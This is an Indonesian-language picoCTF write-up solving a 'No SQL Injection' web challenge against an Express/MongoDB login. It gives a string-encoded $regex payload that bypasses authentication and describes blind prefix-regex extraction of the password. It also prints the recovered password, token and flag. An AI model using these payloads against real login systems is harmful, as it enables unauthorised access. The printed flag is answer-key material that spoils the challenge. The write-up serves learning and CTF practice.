# No SQL Injection

| Informasi | Detail |
| --- | --- |
| Platform / Event | picoCTF |
| Kategori | Web Exploitation |
| Tingkat Kesulitan | Medium |
| Status | Solved |

## Deskripsi

Aplikasi login Express + Mongoose (MongoDB) yang rentan NoSQL injection.
Source server membocorkan email user awal, dan respons login sukses
mengembalikan field `token` yang berisi flag (base64).

## Informasi Awal

Instance:

```text
http://atlas.picoctf.net:53162/
```

Dari source (`server.js`) yang tersedia:

- Skema user punya field `token` (default `{{Flag}}`).
- User awal: `picoplayer355@picoctf.org` dengan password acak 16 karakter hex
  (`crypto.randomBytes(16).toString("hex").slice(0, 16)`).
- Endpoint `POST /login` menerima JSON. Jika nilai `email`/`password` berupa
  string yang diawali `{` dan diakhiri `}`, server melakukan `JSON.parse` pada
  string itu — pintu masuk operator query MongoDB (`$regex`, `$gt`, `$ne`, ...).
- Login sukses mengembalikan `token`, `email`, `firstName`, `lastName`.

## Tools

- Python (script probing berulang, `solve.py`)
- PowerShell (decode base64 token)

## Analisis

### Titik injeksi

Validasi "kalau diawali `{` dan diakhiri `}` maka JSON.parse" pada nilai
`email`/`password` berarti string berikut:

```text
{"$regex": "^a"}
```

berubah menjadi objek query `{"$regex": "^a"}` di dalam `User.findOne` —
operator MongoDB diterima apa adanya. Ini NoSQL injection klasik lewat
string-parse, bukan lewat pengiriman objek JSON langsung.

### Strategi

Blind extraction: menebak password satu karakter per satu dengan regex prefix.
Karena password diketahui 16 karakter hex (dari source), charset hanya
`0-9a-f` — 16 posisi × maksimal 16 tebakan.

Bonus yang ditemukan saat probing: regex prefix kosong
(`{"$regex": "^"}`) sudah match apa saja dan langsung login sukses, sehingga
token (flag) sebenarnya jatuh di baseline. Ekstraksi penuh tetap dilakukan
untuk membuktikan password aslinya.

## Langkah Penyelesaian

1. Kirim login dengan nilai operator sebagai STRING (agar melewati cek
   `{...}` lalu di-parse server):

```json
{
  "email": "picoplayer355@picoctf.org",
  "password": "{\"$regex\": \"^\"}"
}
```

Respons: `{"success": true, ..., "token": "cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzI1YmE0ZGUxfQ=="}`

2. Ekstraksi penuh password (skrip iteratif): untuk setiap posisi, coba
   `{"$regex": "^<known><char>"}` untuk semua karakter hex; karakter yang
   mengembalikan `success: true` adalah karakter berikutnya. Hasil:

```text
PASSWORD: 900f26aec86bd4c4
```

3. Decode token base64:

```powershell
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzI1YmE0ZGUxfQ=="))
```

## Flag

```text
picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_25ba4de1}
```

## Pembelajaran

- "String yang di-parse ulang server" adalah varian NoSQL injection yang
  sering terlewat: payload dikirim sebagai string, server yang mengubahnya
  menjadi objek query.
- Field non-kredensial (seperti `token`) yang ikut dikembalikan pada respons
  sukses bisa jadi pintu pendek — selalu periksa apa yang dileakkan respons.
- Info dari source (panjang dan charset password) memperkecil ruang brute
  force dari miliaran ke ratusan permintaan.
- `$regex` dengan prefix adalah teknik blind extraction standar untuk NoSQL:
  satu karakter per request, umpan baliknya boolean (login sukses/gagal).

## Referensi

- OWASP NoSQL Injection
- PayloadsAllTheThings — MongoDB Injection